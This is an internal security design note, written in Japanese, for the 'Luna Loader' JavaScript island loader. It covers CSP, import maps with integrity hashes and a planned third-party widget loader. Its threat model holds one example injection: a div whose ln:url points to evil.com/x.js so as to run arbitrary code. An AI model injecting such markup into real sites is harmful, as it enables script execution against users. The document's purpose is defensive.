# Luna Loader セキュリティ設計（内部文書）

**この文書は非公開です。**

---

## ユースケースの分離

| ユースケース | 説明 | ローダー |
|-------------|------|---------|
| **セルフホスト** | 自分のサイトでLunaを使用 | `loader.js`（現行） |
| **サードパーティ** | 他サイトに埋め込むウィジェット | 専用ローダー（Shard実装時） |

---

# セルフホスト向け

## 脅威モデル

- **前提**: XSS経由でHTMLインジェクションが可能な状況
- **攻撃**: `<div ln:id="x" ln:url="https://evil.com/x.js">` を注入し任意コード実行

## 対策

### 第1層: CSP (Content-Security-Policy)

```http
Content-Security-Policy: script-src 'self'
```

外部オリジンからの `import()` を完全にブロック。

### 第2層: Import Maps + Integrity

参考: https://jspm.org/js-integrity-with-import-maps

```html
<script type="importmap">
{
  "imports": {
    "#counter": "/islands/counter.js"
  },
  "integrity": {
    "/islands/counter.js": "sha384-..."
  }
}
</script>

<div ln:id="counter" ln:url="#counter">...</div>
```

- `import()` にintegrityが適用される
- ローダー変更不要

## 対応済みの修正

- ~~`url:` プレフィックス~~ 削除済み（SSRF対策）

## 次のアクション

- [ ] Sol CLIにImport Map + integrity自動生成機能を実装

---

# サードパーティ向け（Shard実装時に詳細化）

## 方針

- **推奨**: iframe分離
- **代替**: 単一Island専用ローダー

## 単一Island専用ローダーの設計

### 制約

- 単一Islandのみ（複数 `ln:id` はエラー）
- `ln:url` 属性不使用（Import Mapで解決）
- MutationObserver なし
- グローバル変数なし

### スニペット構造

```html
<!-- 1. Import Map（必ず先に定義） -->
<script type="importmap">
{
  "imports": { "#widget": "https://cdn.example.com/widget.js" },
  "integrity": { "https://cdn.example.com/widget.js": "sha384-..." }
}
</script>

<!-- 2. ローダー -->
<script type="module" src="https://cdn.example.com/widget-loader.js"></script>

<!-- 3. Island本体（サイズ指定でCLS最適化） -->
<div ln:id="widget" style="width: 400px; height: 300px;">
  <!-- SSRされたHTML -->
</div>
```

### レイアウト最適化

style属性でサイズ指定し、CLS/LCPを最適化:

```html
<!-- 固定サイズ -->
<div ln:id="widget" style="width: 400px; height: 300px;">

<!-- アスペクト比固定 -->
<div ln:id="widget" style="width: 100%; aspect-ratio: 16/9;">
```

### 配布モデル

専用エディタ兼ホスティングサービスからスニペットを生成・提供。

## 次のアクション（Shard実装時）

- [ ] 単一Island専用ローダーの実装
- [ ] スニペット生成機能
- [ ] iframe埋め込みガイド
